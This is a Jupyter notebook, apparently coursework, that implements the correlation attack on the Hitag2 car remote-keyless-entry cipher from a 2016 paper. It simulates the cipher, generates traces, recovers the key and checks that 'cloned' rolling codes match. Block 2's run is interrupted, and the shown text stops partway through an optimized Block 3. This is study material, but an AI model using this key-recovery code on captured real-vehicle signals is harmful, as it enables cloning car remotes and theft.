In [1]:
# =============================================================================
# BLOCK 1 — Hitag2 RKE System Simulation
# Based on pseudocode by Aram Verstegen:
#   https://github.com/factoritbv/hitag2hell
# Reference paper: Garcia et al., USENIX Security 2016, Section 4
# =============================================================================

# -----------------------------------------------------------------------------
# Helper: selects 4 bits from an integer state at indices a,b,c,d
# and combines them into a 4-bit index (MSB-first: a is the most significant bit)
# -----------------------------------------------------------------------------
def i4(x, a, b, c, d):
    """Extracts 4 bits at positions a,b,c,d and assembles them into a nibble."""
    return (((x >> a) & 1) * 8 +
            ((x >> b) & 1) * 4 +
            ((x >> c) & 1) * 2 +
            ((x >> d) & 1))

# -----------------------------------------------------------------------------
# The five sub-circuits of filter function f20 (Definition 4.2)
# Note: constants 0x3c65, 0xee5, 0xdd3929b are the same boolean
# tables as in the paper (0xA63C, 0xA770, 0xD949CBB0) but bit-reversed
# to match the LSB-first convention of the implementation.
# -----------------------------------------------------------------------------
def f20_0(state):
    """fa(x2, x3, x5, x6) — first fa sub-circuit"""
    return (0x3c65 >> i4(state, 2, 3, 5, 6)) & 1

def f20_1(state):
    """fb(x8, x12, x14, x15) — second fb sub-circuit"""
    return (0xee5 >> i4(state, 8, 12, 14, 15)) & 1

def f20_2(state):
    """fb(x17, x21, x23, x26) — third fb sub-circuit"""
    return (0xee5 >> i4(state, 17, 21, 23, 26)) & 1

def f20_3(state):
    """fb(x28, x29, x31, x33) — fourth fb sub-circuit"""
    return (0xee5 >> i4(state, 28, 29, 31, 33)) & 1

def f20_4(state):
    """fa(x34, x43, x44, x46) — fifth fa sub-circuit"""
    return (0x3c65 >> i4(state, 34, 43, 44, 46)) & 1

def f20_last(s0, s1, s2, s3, s4):
    """fc: combines the 5 output bits into a single keystream bit."""
    idx = s0 * 16 + s1 * 8 + s2 * 4 + s3 * 2 + s4
    return (0xdd3929b >> idx) & 1

def f20(state):
    """
    Complete filter function f20: F2^48 -> F2  (Definition 4.2)
    Takes the 48-bit LFSR state, returns 1 keystream bit.
    """
    return f20_last(
        f20_0(state),
        f20_1(state),
        f20_2(state),
        f20_3(state),
        f20_4(state)
    )

# -----------------------------------------------------------------------------
# LFSR Feedback (Definition 4.1)
# L(x0..x47) = x0 xor x2 xor x3 xor ... xor x47
# -----------------------------------------------------------------------------
def lfsr_feedback(state):
    """Computes the feedback bit of the Hitag2 primitive polynomial."""
    return (
        (state >> 0)  ^ (state >> 2)  ^ (state >> 3)  ^
        (state >> 6)  ^ (state >> 7)  ^ (state >> 8)  ^
        (state >> 16) ^ (state >> 22) ^ (state >> 23) ^
        (state >> 26) ^ (state >> 30) ^ (state >> 41) ^
        (state >> 42) ^ (state >> 43) ^ (state >> 46) ^
        (state >> 47)
    ) & 1

def lfsr_clock(state):
    """
    Advances the LFSR by one cycle: right-shift by 1, new bit at position 47.
    Convention: bit 0 = logical MSB of the stream (enters from the left of the register).
    """
    return (state >> 1) | (lfsr_feedback(state) << 47)

# -----------------------------------------------------------------------------
# Initialization (Definition 4.4)
# -----------------------------------------------------------------------------
def hitag2_init(key: int, uid: int, counter: int, button: int) -> int:
    """
    Initializes the Hitag2 cipher and returns the LFSR state ready
    for keystream generation.

    Phase 1 — Initial state loading (Eq. 1+2):
      Bits 47..16 (high): k[32]..k[47] then uid[0]..uid[31]  (sequential left-shift)
      Result: 48-bit state with uid[0] as the highest bit

    Phase 2 — Mixing with IV (Eq. 3), 32 cycles:
      nonce = (counter << 4) | button
      For each bit i (MSB-first on nonce and key):
        new_bit = f20(state) XOR nonce[31-i] XOR key[31-i]
        state = (state >> 1) | (new_bit << 47)

    Parameters:
      key     : 48-bit key
      uid     : 32-bit identifier
      counter : 28-bit counter (lctr = 10 LSBs transmitted)
      button  : 4-bit button code

    Returns:
      48-bit LFSR state ready for hitag2_keystream()
    """
    # IV = counter || button (32 bits, counter occupies the 28 high bits)
    nonce = (counter << 4) | (button & 0xF)

    # Phase 1: load k[32..47] then uid[0..31] into state (left-shift)
    state = 0
    for i in range(32, 48):                        # k[32]..k[47]
        state = (state << 1) | ((key >> i) & 1)
    for i in range(0, 32):                         # uid[0]..uid[31]
        state = (state << 1) | ((uid >> i) & 1)

    # Phase 2: 32 mixing cycles with nonce and key (right-shift)
    for i in range(0, 32):
        nonce_bit = (nonce >> (31 - i)) & 1        # MSB-first on nonce
        key_bit   = (key   >> (31 - i)) & 1        # k[31]..k[0]
        new_bit   = f20(state) ^ nonce_bit ^ key_bit
        state = (state >> 1) | (new_bit << 47)

    return state

def hitag2_keystream(state: int, length: int = 32) -> int:
    """
    Generates 'length' keystream bits from the initialized state.

    Eq. 5: ks_i = f20(state_i), then state advances with lfsr_clock().
    Bits are assembled MSB-first in the returned value.

    Returns: integer containing the keystream bits (bit 0 = last generated bit)
    """
    ks = 0
    for i in range(length):
        ks = (ks << 1) | f20(state)
        state = lfsr_clock(state)
    return ks

# -----------------------------------------------------------------------------
# Rolling code generation (Figure 11)
# -----------------------------------------------------------------------------
def generate_rolling_code(key: int, uid: int, ctr: int, btn: int) -> dict:
    """
    Generates a Hitag2 rolling code packet.
    Figure 11: [0x0001(16)] [UID(32)] [btn(4)] [lctr(10)] [ks(32)] [chk(8)]

    The checksum is the XOR of all payload bytes (parity byte).
    """
    state = hitag2_init(key, uid, ctr, btn)
    ks = hitag2_keystream(state, 32)
    lctr = ctr & 0x3FF   # 10 LSBs of the counter

    # Checksum: XOR of UID + lctr + ks bytes
    chk = 0
    for byte in [(uid >> s) & 0xFF for s in (0, 8, 16, 24)]:
        chk ^= byte
    chk ^= (lctr >> 2) & 0xFF
    chk ^= ((lctr & 0x3) << 6) | ((ks >> 26) & 0x3F)
    for s in (18, 10, 2):
        chk ^= (ks >> s) & 0xFF
    chk ^= (ks & 0x3) << 6

    return {
        'key':  key,
        'uid':  uid,
        'ctr':  ctr,
        'btn':  btn,
        'lctr': lctr,
        'ks':   ks,
        'chk':  chk & 0xFF,
    }

# =============================================================================
# Sanity Tests
# =============================================================================
if __name__ == "__main__":
    import random
    random.seed(42)

    KEY = random.getrandbits(48)
    UID = random.getrandbits(32)
    CTR = random.randint(0, 0x3FF)
    BTN = 0b0001

    print("=" * 60)
    print("HITAG2 RKE SYSTEM TEST (reference code)")
    print("=" * 60)
    print(f"  KEY : 0x{KEY:012X}")
    print(f"  UID : 0x{UID:08X}")
    print(f"  CTR : {CTR}  (lctr={CTR & 0x3FF})")
    print(f"  BTN : {BTN:04b}")

    rc = generate_rolling_code(KEY, UID, CTR, BTN)
    print(f"\n  ks  : 0x{rc['ks']:08X}")
    print(f"  chk : 0x{rc['chk']:02X}")

    # Determinism
    state2 = hitag2_init(KEY, UID, CTR, BTN)
    ks2 = hitag2_keystream(state2, 32)
    assert rc['ks'] == ks2, "ERROR: non-deterministic!"
    print("\n[OK] Deterministic")

    # Key sensitivity
    ks_bad = hitag2_keystream(hitag2_init(KEY ^ 1, UID, CTR, BTN), 32)
    assert rc['ks'] != ks_bad, "ERROR: insensitive to key!"
    print("[OK] Key-sensitive")

    # Generate 4 traces for Block 2
    traces = []
    print("\nTRACES FOR THE CORRELATION ATTACK:")
    for i in range(4):
        rc_i = generate_rolling_code(KEY, UID, CTR + i, BTN)
        traces.append({'uid': UID, 'iv': ((CTR + i) << 4) | BTN,
                       'ks': rc_i['ks'], 'ctr': CTR + i, 'btn': BTN})
        print(f"  [trace {i}] ctr={CTR+i}  ks=0x{rc_i['ks']:08X}")

    print("\n[OK] 'traces' and 'KEY' saved — ready for Block 2.")

HITAG2 RKE SYSTEM TEST (reference code)
  KEY : 0x1C80A3B1799D
  UID : 0x06671AD1
  CTR : 563  (lctr=563)
  BTN : 0001

  ks  : 0x5D3E7EDB
  chk : 0x57

[OK] Deterministic
[OK] Key-sensitive

TRACES FOR THE CORRELATION ATTACK:
  [trace 0] ctr=563  ks=0x5D3E7EDB
  [trace 1] ctr=564  ks=0x793713B7
  [trace 2] ctr=565  ks=0x7D0FEC7D
  [trace 3] ctr=566  ks=0x7934382B

[OK] 'traces' and 'KEY' saved — ready for Block 2.


In [2]:
# =============================================================================
# BLOCK 2 — Correlation Attack on Hitag2 (NAIVE / DIDACTIC VERSION)
# Section 4.4 of the paper: Garcia et al., USENIX Security 2016
# =============================================================================
#
# IMPORTANT NOTE: this implementation is deliberately "naive", written
# for maximum readability and 1:1 correspondence with the paper. It is NOT meant
# to run to completion on Colab (estimated time is hours/
# days). It serves as algorithmic documentation in the report.
# An optimized version (with NumPy and pre-computed tables) is provided
# in Block 3.
#
# Paper references:
#   - Step 1-4: Section 4.4, paragraphs 1-4
#   - Step 5:   Section 4.4, paragraphs 5
#   - Scoring:  Definition 4.5
#   - Keystream: Equation 5
#   - Initialization: Definition 4.4, Equations 1-4
# =============================================================================

import time

# -------------------------------------------------------------------------
# PREREQUISITES: all Block 1 functions must already be defined
# (i4, f20_0..f20_4, f20_last, f20, lfsr_feedback, lfsr_clock,
#  hitag2_init, hitag2_keystream, generate_rolling_code)
# as well as KEY, UID, CTR, BTN and the 'traces' list.
# -------------------------------------------------------------------------

# =============================================================================
# ATTACK CONSTANTS
# =============================================================================

# The 20 positions of the 48-bit state read by filter function f20
# (Definition 4.2, Figure 10)
INPUT_POSITIONS = [2, 3, 5, 6, 8, 12, 14, 15,
                   17, 21, 23, 26, 28, 29, 31, 33,
                   34, 43, 44, 46]

# Maximum candidate table size (Sec. 4.4, Step 4):
# "Experiments show that a table of size 400,000 guesses is usually
#  sufficient."
TABLE_SIZE = 400_000

# Number of keystream bits to test in the initial phase (Step 2-3).
# The 16-bit window, after shifting 32 positions, covers up to
# 16 keystream bits (ks0..ks15) with decreasing information.
N_KS_INITIAL = 16

# =============================================================================
# PRE-COMPUTATION: complete f20 table for all 2^20 = 1,048,576 inputs
# =============================================================================
# We compute f20(x) for every possible combination of the 20 input bits.
# This avoids reconstructing the 48-bit state every time.
# =============================================================================

print("Pre-computing f20 table for 2^20 inputs...")
t0 = time.time()

F20_TABLE = bytearray(1 << 20)
for x in range(1 << 20):
    # Map the 20 bits of x to the correct positions of the 48-bit state
    state = 0
    for bit_idx in range(20):
        if (x >> bit_idx) & 1:
            state |= (1 << INPUT_POSITIONS[bit_idx])
    F20_TABLE[x] = f20(state)

print(f"  Completed in {time.time() - t0:.1f}s")

# =============================================================================
# FUNCTION: bit_score (Definition 4.5)
# =============================================================================
# bit_score(x0...x_{n-1}, b) = #{b == f20(y0...y19)} / 2^{19-n}
#
# where y0..y_{n-1} = x0..x_{n-1} are the KNOWN bits (from the window),
# and y_n..y_19 vary freely over all 2^{20-n} possible values.
#
# The result is in [0, 2]:
#   1.0 = no correlation (known bit provides no information)
#   >1  = positive correlation (guess is probably correct)
#   <1  = negative correlation
# =============================================================================

def bit_score(known_bits, target_bit):
    """
    Definition 4.5 — Single-bit correlation score.

    Parameters:
      known_bits : dict {f20_index (0..19): value (0 o 1)}
                   window bits that fall on f20 inputs
      target_bit : the observed keystream bit (0 or 1)

    Returns: float in [0, 2]
    """
    n_known = len(known_bits)
    if n_known == 0:
        return 1.0  # no information → neutral score

    n_unknown = 20 - n_known
    unknown_indices = [i for i in range(20) if i not in known_bits]

    # Count how many of the 2^{20-n} assignments of unknown bits
    # produce f20() == target_bit
    count = 0
    for mask in range(1 << n_unknown):
        # Build the complete 20-bit vector
        x = 0
        # Place the known bits
        for idx, val in known_bits.items():
            if val:
                x |= (1 << idx)
        # Place the unknown bits from the current mask
        for bit_pos, unk_idx in enumerate(unknown_indices):
            if (mask >> bit_pos) & 1:
                x |= (1 << unk_idx)

        if F20_TABLE[x] == target_bit:
            count += 1

    # Normalization (Def. 4.5): divide by 2^{19-n}
    return count / (1 << (19 - n_known))


# =============================================================================
# FUNCTION: identifies which f20 inputs are known given the state
# =============================================================================

def get_known_f20_inputs(known_lfsr_bits, time_offset):
    """
    Given a set of known LFSR bits (absolute positions → values)
    and a time offset, determines which of the 20 f20 inputs are known.

    At time t, the state is α_t = a[t]..a[t+47].
    f20 reads INPUT_POSITIONS of state α_t,
    which correspond to absolute bits a[t + INPUT_POSITIONS[i]].

    Eq. 5: ks_i = f(a_{32+i} ... a_{79+i})
    So for keystream bit i, time_offset = 32 + i.

    Returns: dict {f20_index (0..19): bit_value}
    """
    known = {}
    for f20_idx, state_pos in enumerate(INPUT_POSITIONS):
        abs_pos = time_offset + state_pos
        if abs_pos in known_lfsr_bits:
            known[f20_idx] = known_lfsr_bits[abs_pos]
    return known


# =============================================================================
# FUNCTION: multi-bit score on a single trace (Definition 4.5)
# =============================================================================
# score(x0...x_{n-1}, ks0...ks_{n-1}) =
#     bit_score(x_{n-1}, ks_{n-1}) * score(x0...x_{n-2}, ks0...ks_{n-2})
#
# It is the product of scores for each testable keystream bit.
# =============================================================================

def score_single_trace(known_lfsr_bits, ks, n_ks_bits):
    """
    Computes the correlation score (product, Def. 4.5) for a single
    trace, testing up to n_ks_bits keystream bits.

    Parameters:
      known_lfsr_bits : dict {absolute_position: value} of known LFSR bits
      ks              : observed keystream (32 bits, MSB-first)
      n_ks_bits       : how many keystream bits to test (max 32)
    """
    score = 1.0
    for t in range(n_ks_bits):
        # Eq. 5: ks_t = f(a_{32+t} .. a_{79+t})
        known_inputs = get_known_f20_inputs(known_lfsr_bits, 32 + t)
        if len(known_inputs) == 0:
            break  # no known input → no information
        ks_bit = (ks >> (31 - t)) & 1  # MSB-first
        score *= bit_score(known_inputs, ks_bit)
    return score


# =============================================================================
# STEP 1-4: Guess k0..k15, scoring, sorting, pruning
# =============================================================================
# Step 1 (Sez. 4.4): "The adversary first guesses a 16-bit window
#   corresponding to LFSR stream bits a32...a47."
#   "Observe that a32...a47 = k0...k15" (Eq. 2)
#   "together with the UID, this gives the adversary LFSR bits
#    a0...a47" (Eq. 1 + Eq. 2)
#
# Step 2: "shift this 16-bit window to the left of the LFSR, until
#   bits a32...a47 are on the very left" — at time 32, the window
#   [a32..a47] occupies positions [0..15] of the state, and the cipher
#   begins emitting keystream (Eq. 5).
#
# Step 3: Compute the average correlation score over all traces.
#   "The adversary will assign this guess the average score over
#    all traces."
#   "Note that, so far this scoring computation is independent of
#    the value iv as it happens before iv gets to have any influence."
#
# Step 4: "sort all guesses according to their score and store them
#   in a table of fixed size"
# =============================================================================

print("\n" + "=" * 60)
print("STEP 1-4: Guess k0..k15 (2^16 = 65.536 candidates)")
print("=" * 60)
print(f"  UID:    0x{UID:08X}")
print(f"  Traces: {len(traces)}")
print(f"  True key (for verification): 0x{KEY:012X}")

true_k0_15 = KEY & 0xFFFF
print(f"  True k0..k15 : 0x{true_k0_15:04X}\n")

t_step1 = time.time()
candidates = []

for guess in range(1 << 16):
    # Progress
    if guess % 0x2000 == 0:
        pct = 100 * guess / (1 << 16)
        elapsed = time.time() - t_step1
        print(f"  [{pct:5.1f}%] guess 0x{guess:04X} ... ({elapsed:.0f}s)", end='\r')

    # Step 1: construct known LFSR bits a[0..47]
    #   a[0..31]  = UID  (Eq. 1)
    #   a[32..47] = k[0..15] = guess  (Eq. 2)
    known_bits = {}
    for j in range(32):
        known_bits[j] = (UID >> j) & 1
    for j in range(16):
        known_bits[32 + j] = (guess >> j) & 1

    # Step 2-3: compute average score over all traces
    # The window [a32..a47] has been "shifted" to time 32 (Step 2),
    # and now f20 reads inputs at INPUT_POSITIONS of
    # state α_32 = a[32..79]. Bits a[32..47] are known (from the window),
    # bits a[48..79] are unknown → bit_score enumerates them.
    total_score = 0.0
    for tr in traces:
        s = score_single_trace(known_bits, tr['ks'], N_KS_INITIAL)
        total_score += s
    avg_score = total_score / len(traces)

    candidates.append((avg_score, guess))

elapsed_step1 = time.time() - t_step1
print(f"\n  Completed in {elapsed_step1:.1f}s")

# Step 4: sorting and pruning
candidates.sort(key=lambda x: x[0], reverse=True)
candidates = candidates[:TABLE_SIZE]

# Report: top-10 and position of correct guess
print(f"\n  Top-10 candidates:")
for rank, (sc, g) in enumerate(candidates[:10]):
    marker = " ◄◄◄ CORRECT" if g == true_k0_15 else ""
    print(f"    #{rank+1:5d}  k0_15=0x{g:04X}  score={sc:.6f}{marker}")

for rank, (sc, g) in enumerate(candidates):
    if g == true_k0_15:
        print(f"\n  Correct guess 0x{true_k0_15:04X} → rank {rank+1}/{len(candidates)}"
              f"  (score={sc:.6f})")
        break
else:
    print(f"\n  ⚠ Correct guess NOT in the table (pruned)!")

print(f"  Candidates in tables: {len(candidates)}")


# =============================================================================
# STEP 5: Window extension (from 17 to 32 bits)
# =============================================================================
# "For each guess in the table, the adversary goes back to Step (1)
#  and proceeds as before, except that she will now extend the window
#  size by one (to size 17,...,32), guessing the next LFSR stream bit
#  (a48,...,a63)."
#
# Eq. 3: a_{48+i} = k_{16+i} ⊕ iv_i ⊕ f(a_i ... a_{i+47})
#
# "Special care needs to be taken at Step (3) while scoring multiple
#  traces, since a48+i = k_{16+i} ⊕ iv_i ⊕ b_i (see Eq. 3) and the
#  iv will be different in each trace. This is not a problem since in
#  the previous Step (1) we had computed the corresponding keystream
#  bit b_i, and iv_i is sent in clear. Therefore key bits k_{16+i} can
#  be computed for i ∈ [0,31]."
#
# NOTE: b_i in the paper text is NOT a keystream bit ks_i, but the
# value f(a_i..a_{i+47}) computed during the initialization phase
# (mixing, Eq. 3). For i=0, b_0 = f(a_0..a_47) is constant across all
# traces (depends only on UID and k0..k15). For i>0, b_i also depends on
# bits a_48..a_{47+i} which in turn depend on the trace's IV.
# =============================================================================

print("\n" + "=" * 60)
print("STEP 5: Window extension (17 → 32 bit, 16 iterations)")
print("=" * 60)

# We represent each candidate as (score, k0_15, k16_plus)
# where k16_plus is an integer accumulating bits k16, k17, ... as
# the window extends. The i-th bit (LSB = k16) is found at
# position i of k16_plus.
extended = [(sc, g, 0) for sc, g in candidates]

t_step5 = time.time()

for ext_round in range(16):
    # ext_round = 0 → guessing k16 (window size: 17)
    # ext_round = 15 → guessing k31 (window size: 32)

    t_round = time.time()
    n_extended = ext_round + 1   # how many k16+ bits we have after this round
    key_bit_index = 16 + ext_round  # which key bit we are guessing

    print(f"\n  Round {ext_round}: guessing k{key_bit_index} "
          f"(window → {16 + n_extended} bit, "
          f"{len(extended)} candidates × 2)...")

    new_candidates = []

    for cand_idx, (old_score, k0_15, k16_plus) in enumerate(extended):
        if cand_idx % 10000 == 0 and cand_idx > 0:
            print(f"    {cand_idx}/{len(extended)}...", end='\r')

        # Try both values for the new key bit
        for new_bit in [0, 1]:
            new_k16_plus = k16_plus | (new_bit << ext_round)

            # Compute average score over all traces with the
            # extended window
            total_score = 0.0

            for tr in traces:
                iv = tr['iv']

                # Reconstruct known LFSR bits: a[0..47+n_extended]
                a = {}
                # Eq. 1: a[i] = id[i] for i in [0,31]
                for j in range(32):
                    a[j] = (UID >> j) & 1
                # Eq. 2: a[32+i] = k[i] for i in [0,15]
                for j in range(16):
                    a[32 + j] = (k0_15 >> j) & 1

                # Eq. 3: a[48+i] = k[16+i] ⊕ iv[i] ⊕ f(a[i..i+47])
                # for i in [0, n_extended-1]
                for i in range(n_extended):
                    # Reconstruct state α_i = a[i..i+47]
                    state = 0
                    for j in range(48):
                        state |= (a[i + j] << j)
                    b_i = f20(state)

                    iv_bit = (iv >> (31 - i)) & 1  # MSB-first
                    k_bit = (new_k16_plus >> i) & 1
                    a[48 + i] = k_bit ^ iv_bit ^ b_i

                # Compute score with more testable keystream bits
                n_ks_test = min(N_KS_INITIAL + n_extended, 32)
                score = score_single_trace(a, tr['ks'], n_ks_test)
                total_score += score

            avg_score = total_score / len(traces)
            new_candidates.append((avg_score, k0_15, new_k16_plus))

    # Sort and prune (Step 4 repeated)
    new_candidates.sort(key=lambda x: x[0], reverse=True)
    extended = new_candidates[:TABLE_SIZE]

    # Verify: is the correct candidate still in the table?
    true_k16_plus = 0
    for i in range(n_extended):
        true_bit = (KEY >> (16 + i)) & 1
        true_k16_plus |= (true_bit << i)

    found_rank = None
    for rank, (sc, k015, k16p) in enumerate(extended):
        if k015 == true_k0_15 and k16p == true_k16_plus:
            found_rank = rank + 1
            break

    elapsed_round = time.time() - t_round
    if found_rank:
        print(f"    Correct candidate at rank {found_rank} "
              f"(score={extended[found_rank-1][0]:.6f}, {elapsed_round:.1f}s)")
    else:
        print(f"    ⚠ Correct candidate ELIMINATED by pruning! "
              f"({elapsed_round:.1f}s)")

elapsed_step5 = time.time() - t_step5
print(f"\n  Step 5 completed in {elapsed_step5:.1f}s")


# =============================================================================
# FINAL PHASE: verify candidates and recover k32..k47
# =============================================================================
# At this point we have determined (in theory) k0..k31 (32 bits).
# The Hitag2 key is 48 bits, so k32..k47 (16 bits) are missing.
#
# In the paper, window extension covers bits a48..a63, which
# via Eq. 3 give access to k16..k47 (32 bits). Together with the initial
# guess k0..k15, the key is fully determined.
#
# In our implementation, extension gives k16..k31 (16 bits).
# For the remaining k32..k47, we brute force over 2^16 = 65,536
# values, verifying against the known traces.
#
# NOTE: this brute force is fast because hitag2_init + hitag2_keystream
# are O(1) per single verification, and 65,536 attempts are trivial.
# =============================================================================

print("\n" + "=" * 60)
print("FINAL PHASE: recovering k32..k47 (brute force 2^16)")
print("=" * 60)

N_TOP_CANDIDATES = min(100, len(extended))
print(f"  Verifying top-{N_TOP_CANDIDATES} candidates...\n")

t_final = time.time()
recovered_key = None

for rank, (sc, k0_15, k16_31) in enumerate(extended[:N_TOP_CANDIDATES]):
    # Reconstruct the 32 high bits of the key: k0..k15 and k16..k31
    # Mapping paper → code hitag2_init:
    #   hitag2_init loads key[32..47] into a[32..47] in Phase 1
    #   hitag2_init uses key[31-i] in mixing (Phase 2)
    #
    # Therefore:
    #   paper k[0..15] = code key >> 32  (16 bit alti)
    #   paper k[16..47] = code key[0..31] (lower 32 bits, order to verify)

    for k32_47 in range(1 << 16):
        # Assemble the 48-bit key
        key_candidate = (k0_15 << 32) | (k16_31 << 16) | k32_47

        # Quick verification on first trace
        tr0 = traces[0]
        state = hitag2_init(key_candidate, UID, tr0['ctr'], tr0['btn'])
        ks = hitag2_keystream(state, 32)

        if ks != tr0['ks']:
            continue  # no match → next attempt

        # Verify on all remaining traces
        all_match = True
        for tr in traces[1:]:
            state = hitag2_init(key_candidate, UID, tr['ctr'], tr['btn'])
            ks = hitag2_keystream(state, 32)
            if ks != tr['ks']:
                all_match = False
                break

        if all_match:
            recovered_key = key_candidate
            print(f"  FOUND at rank {rank+1}, k32_47=0x{k32_47:04X}")
            break

    if recovered_key is not None:
        break

    if (rank + 1) % 10 == 0:
        print(f"  Candidate #{rank+1}: no match", end='\r')

elapsed_final = time.time() - t_final

# =============================================================================
# RESULT
# =============================================================================

print("\n" + "=" * 60)
print("FINAL RESULT")
print("=" * 60)

if recovered_key is not None:
    print(f"  Recovered key: 0x{recovered_key:012X}")
    print(f"  True key:      0x{KEY:012X}")
    match = recovered_key == KEY
    print(f"  Match:   {'✓ ATTACK SUCCESSFUL' if match else '✗ DIFFERENT'}")
    print(f"\n  Timings:")
    print(f"    Step 1-4 (guess k0..k15):  {elapsed_step1:.1f}s")
    print(f"    Step 5 (extension):       {elapsed_step5:.1f}s")
    print(f"    Final phase (brute force): {elapsed_final:.1f}s")
    print(f"    TOTAL:                    {elapsed_step1 + elapsed_step5 + elapsed_final:.1f}s")

    # Validation: remote cloning
    print(f"\n  VALIDATION — rolling codes generated with cloned key:")
    for i in range(4):
        new_ctr = CTR + len(traces) + i
        rc_orig  = generate_rolling_code(KEY, UID, new_ctr, BTN)
        rc_clone = generate_rolling_code(recovered_key, UID, new_ctr, BTN)
        ok = "✓" if rc_orig['ks'] == rc_clone['ks'] else "✗"
        print(f"    ctr={new_ctr}: orig=0x{rc_orig['ks']:08X}  "
              f"clone=0x{rc_clone['ks']:08X}  {ok}")
else:
    print(f"  ✗ Key NOT found in top-{N_TOP_CANDIDATES} candidates.")
    print(f"  Possible causes:")
    print(f"    - The correct candidate was eliminated during pruning")
    print(f"    - More traces needed (try 6-8 instead of 4)")
    print(f"    - Insufficient TABLE_SIZE")
    print(f"    - Paper ↔ code mapping to review")
    print(f"  Tempo: {elapsed_step1 + elapsed_step5 + elapsed_final:.1f}s")

print("\n[END BLOCK 2]")

Pre-computing f20 table for 2^20 inputs...
  Completed in 8.5s

STEP 1-4: Guess k0..k15 (2^16 = 65.536 candidates)
  UID:    0x06671AD1
  Traces: 4
  True key (for verification): 0x1C80A3B1799D
  True k0..k15 : 0x799D



KeyboardInterrupt: 

In [3]:
# =============================================================================
# BLOCK 3 — Correlation Attack on Hitag2 (OPTIMIZED VERSION)
# Section 4.4 of the paper: Garcia et al., USENIX Security 2016
# =============================================================================
#
# Full score recomputation at every round, with criterion
# |mean(log_score)| for ranking. The mean of logs is computed
# WITH SIGN across all traces, then we take |abs| of the total.
#
# The ranking uses abs() only on the TOTAL across traces,
# preserving the coherent sign of the correct guess's log-score.
# =============================================================================

import time
import numpy as np
import math

INPUT_POSITIONS = [2, 3, 5, 6, 8, 12, 14, 15,
                   17, 21, 23, 26, 28, 29, 31, 33,
                   34, 43, 44, 46]

TABLE_SIZE   = 131_072
N_KS_INITIAL = 16
N_EXT_ROUNDS = 16
N_TRACES     = 8

# =============================================================================
# TRACES
# =============================================================================

if len(traces) < N_TRACES:
    print(f"Generating {N_TRACES} non-consecutive traces...")
    traces = []
    for i in range(N_TRACES):
        ctr_i = CTR + i * 7
        rc = generate_rolling_code(KEY, UID, ctr_i, BTN)
        traces.append({'uid': UID, 'iv': (ctr_i << 4) | BTN,
                       'ks': rc['ks'], 'ctr': ctr_i, 'btn': BTN})
        print(f"  [trace {i}] ctr={ctr_i}  ks=0x{rc['ks']:08X}")
else:
    traces = traces[:N_TRACES]

true_guess = (KEY >> 32) & 0xFFFF
print(f"\nKEY = 0x{KEY:012X}, correct guess = 0x{true_guess:04X}")

# =============================================================================
# F20_TABLE
# =============================================================================

print("\nF20_TABLE...")
t0_global = time.time()
F20_TABLE = np.zeros(1 << 20, dtype=np.uint8)
for x in range(1 << 20):
    st = 0
    for bi in range(20):
        if (x >> bi) & 1:
            st |= (1 << INPUT_POSITIONS[bi])
    F20_TABLE[x] = f20(st)
print(f"  {time.time()-t0_global:.1f}s")

# =============================================================================
# ON-DEMAND BIT_SCORE TABLES
# =============================================================================

TABLE_CACHE = {}

def get_table(t, n_ext):
    key = (t, n_ext)
    if key in TABLE_CACHE:
        return TABLE_CACHE[key]

    guess_f20 = []
    guess_pos = []
    mixing_f20 = []
    mixing_offsets = []

    for f20_idx, p in enumerate(INPUT_POSITIONS):
        sp = p + t
        if sp <= 15:
            guess_f20.append(f20_idx)
            guess_pos.append(p)
        elif 16 <= sp < 16 + n_ext:
            mixing_f20.append(f20_idx)
            mixing_offsets.append(sp - 16)

    n_g = len(guess_f20)
    n_m = len(mixing_f20)
    n_known = n_g + n_m

    if n_known == 0:
        TABLE_CACHE[key] = None
        return None

    n_unknown = 20 - n_known
    all_known = guess_f20 + mixing_f20
    unknown_f20 = [i for i in range(20) if i not in all_known]

    scores_0 = np.zeros(1 << n_known, dtype=np.float64)
    scores_1 = np.zeros(1 << n_known, dtype=np.float64)

    for kv in range(1 << n_known):
        base_x = 0
        for bp in range(n_known):
            if (kv >> bp) & 1:
                base_x |= (1 << all_known[bp])
        c0 = c1 = 0
        for mask in range(1 << n_unknown):
            x = base_x
            for bp, ui in enumerate(unknown_f20):
                if (mask >> bp) & 1:
                    x |= (1 << ui)
            if F20_TABLE[x] == 0: c0 += 1
            else: c1 += 1
        denom = max(1, 1 << (19 - n_known))
        scores_0[kv] = c0 / denom
        scores_1[kv] = c1 / denom

    result = {
        'guess_f20': guess_f20, 'guess_pos': guess_pos,
        'mixing_f20': mixing_f20, 'mixing_offsets': mixing_offsets,
        'n_guess': n_g, 'n_mixing': n_m,
        'scores_0': scores_0, 'scores_1': scores_1,
    }
    TABLE_CACHE[key] = result
    return result

# Pre-compute Step 1-4 tables
print("Step 1-4 tables...")
t0 = time.time()
for t in range(N_KS_INITIAL):
    get_table(t, 0)
print(f"  {time.time()-t0:.1f}s")

# =============================================================================
# VECTORIZED STEP 1-4
# =============================================================================

print("\n" + "=" * 60)
print("STEP 1-4")
print("=" * 60)

t_step14 = time.time()
all_guesses = np.arange(1 << 16, dtype=np.uint32)
log_scores = np.zeros(1 << 16, dtype=np.float64)

for tr in traces:
    ks = tr['ks']
    tr_log = np.zeros(1 << 16, dtype=np.float64)
    for t in range(N_KS_INITIAL):
        tbl = get_table(t, 0)
        if tbl is None: break
        table_idx = np.zeros(1 << 16, dtype=np.uint32)
        for bp, f20_idx in enumerate(tbl['guess_f20']):
            p = tbl['guess_pos'][bp]
            shift = 15 - p - t
            table_idx |= (((all_guesses >> shift) & 1).astype(np.uint32) << bp)
        ks_bit = (ks >> (31 - t)) & 1
        scores = tbl['scores_1' if ks_bit else 'scores_0'][table_idx]
        tr_log += np.log(np.clip(scores, 1e-10, None))
    log_scores += tr_log  # SIGNED sum across all traces

# Mean across traces, then |abs| for ranking
log_scores /= len(traces)
ranking = np.argsort(-np.abs(log_scores))

true_rank = np.where(ranking == true_guess)[0][0] + 1
print(f"  {time.time()-t_step14:.1f}s, correct guess rank {true_rank}/{1<<16}")

# =============================================================================
# STEP 5 — FULL RECOMPUTATION with correct criterion
# =============================================================================

print("\n" + "=" * 60)
print(f"STEP 5: {N_EXT_ROUNDS} rounds (full recomputation)")
print("=" * 60)

t_step5 = time.time()

cand_guess16 = ranking.copy()
cand_key_ext = np.zeros(len(cand_guess16), dtype=np.uint32)

uid_state = 0
for ii in range(32):
    uid_state |= (((UID >> ii) & 1) << ii)

true_key_ext_full = 0
for i in range(16):
    true_key_ext_full |= (((KEY >> (31 - i)) & 1) << i)

for ext_round in range(N_EXT_ROUNDS):
    t_round = time.time()
    n_ext = ext_round + 1
    n_cand = len(cand_guess16)

